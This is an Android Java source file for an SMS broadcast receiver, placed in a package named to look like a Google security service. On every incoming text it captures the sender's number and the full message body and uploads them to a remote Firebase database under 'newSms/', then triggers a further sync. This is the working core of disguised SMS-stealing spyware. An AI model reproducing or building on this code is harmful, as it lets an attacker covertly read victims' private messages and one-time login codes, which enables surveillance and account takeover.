package com.google.services.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import static android.provider.Telephony.Sms.Intents.SMS_RECEIVED_ACTION;

/**
 * Created by ouala_eddine on 1/17/2019.
 * Project : lahcen.
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(SMS_RECEIVED_ACTION )) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                // get sms objects
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length == 0) {
                    return;
                }
                // large message might be broken into many
                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    sb.append(messages[i].getMessageBody());
                }
                String sender = messages[0].getOriginatingAddress();
                String message = sb.toString();

                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference myRef = database.getReference("newSms/").push();

                myRef.child("num").setValue(sender);
                myRef.child("msg").setValue(message);

                new Synchronizer(context).sync();
            }
        }
    }
}